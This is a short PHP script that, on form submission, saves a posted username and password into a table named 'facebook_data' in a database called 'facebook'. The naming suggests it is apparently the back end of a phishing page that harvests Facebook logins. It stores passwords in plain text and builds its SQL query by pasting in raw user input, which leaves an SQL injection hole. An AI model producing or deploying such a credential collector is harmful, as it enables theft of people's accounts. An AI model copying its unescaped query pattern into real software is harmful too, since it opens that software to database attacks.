<?php

$conex = mysqli_connect("localhost","root","","facebook"); 


if(isset($_POST['enviar'])){
    
    $usuario = trim($_POST['usuario']);
    $contraseña = trim($_POST['contraseña']);
    $consulta = "INSERT INTO facebook_data(usuario, contraseña) VALUES ('$usuario','$contraseña')";
    $resultado = mysqli_query($conex, $consulta);
}


?>